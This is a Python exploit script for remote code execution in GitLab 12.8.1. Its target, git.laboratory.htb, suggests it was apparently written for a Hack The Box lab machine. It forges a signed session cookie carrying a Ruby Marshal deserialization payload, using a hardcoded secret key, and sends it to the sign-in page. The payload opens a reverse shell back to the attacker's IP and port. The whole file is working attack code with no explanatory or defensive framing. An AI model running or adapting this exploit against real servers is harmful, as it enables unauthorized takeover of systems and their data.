#!/bin/python3
# this is for sending payload inside cookie ,of gitlab 12.8.1 , for RCE
import base64
import hashlib
import hmac
from html.parser import HTMLParser
import random
import string
import sys
import time
import urllib.parse
import urllib3

import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_ruby_shit_byte():
        # ruby marshal REEEEEEEEEEEEEE
        length = len(local_ip) + len(str(port)) - 8
        possible_shit_bytes = "jklmnopqrstuvw"
        return possible_shit_bytes[length]

def build_payload(secret):
        payload = "\x04\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\x0E@instanceo:\bERB\b:\t@srcI\"{ruby_shit_byte}exit if fork;c=TCPSocket.new(\"{ip}\",{port});while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end\x06:\x06ET:\x0E@filenameI\"\x061\x06;\tT:\f@linenoi\x06:\f@method:\vresult:\t@varI\"\f@result\x06;\tT:\x10@deprecatorIu:\x1FActiveSupport::Deprecation\x00\x06;\tT"
        payload = payload.replace("{ip}", local_ip).replace("{port}", str(port)).replace("{ruby_shit_byte}",get_ruby_shit_byte())
        key = hashlib.pbkdf2_hmac("sha1", password=secret.encode(), salt=b"signed cookie", iterations=1000, dklen=64)
        base64_payload = base64.b64encode(payload.encode())
        digest = hmac.new(key, base64_payload, digestmod=hashlib.sha1).hexdigest()
        return base64_payload.decode() + "--" + digest

def send_payload(payload):
        cookie = {"experimentation_subject_id": payload}
        result = session.get(url + "/users/sign_in", cookies=cookie, verify=False)
        print("deploying payload - {}".format(result.status_code))
   
url = "https://git.laboratory.htb"
local_ip = "10.10.14.53"
port = 1234     
session = requests.session()
secret = "3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3"
payload = build_payload(secret)
send_payload(payload)




















